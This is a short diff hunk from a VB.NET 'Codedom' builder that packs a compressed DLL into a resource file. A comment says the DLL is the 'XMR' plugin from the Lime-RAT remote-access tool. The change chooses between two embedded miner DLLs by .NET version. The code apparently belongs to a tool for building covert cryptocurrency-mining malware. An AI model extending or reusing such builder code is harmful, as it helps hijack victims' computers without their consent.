@@ -34,7 +34,11 @@ Public Class Codedom
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                 ' XMR DLL source code: https://github.com/NYAN-x-CAT/Lime-RAT/tree/master/Project/Plugins/XMR
-                R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL))
+                If F.txtDotNET.Text = ".NET 4.0" Then
+                    R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL4))
+                Else
+                    R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL))
+                End If
                 R.Generate()
             End Using
 
